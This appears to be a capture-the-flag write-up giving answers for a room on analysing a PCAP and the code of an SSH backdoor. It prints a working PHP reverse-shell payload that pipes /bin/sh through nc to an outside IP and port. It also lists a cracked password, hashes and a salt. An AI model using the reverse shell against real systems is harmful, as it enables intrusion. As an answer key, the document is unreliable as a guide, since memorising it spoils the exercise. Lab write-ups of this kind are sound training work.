## Forensics - Analyse the PCAP 

- What was the URL of the page they used to upload a reverse shell?
**/development/**


- What payload did the attacker use to gain access?
	```php 
	<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
	```

- What password did the attacker use to privesc?
**whenevernoteartinstant**

- How did the attacker establish persistence?
**https://github.com/NinjaJc01/ssh-backdoor**

- Using the fasttrack wordlist, how many of the system passwords were crackable?
**4**

---

## Research - Analyse the code 

- What's the default hash for the backdoor?
**bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3**



- What's the hardcoded salt for the backdoor?
**1c362db832f3f864c8c2fe05f2002a05**

- What was the hash that the attacker used? - go back to the PCAP for this!
**6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**

- Crack the hash using rockyou and a cracking tool of your choice. What's the password?
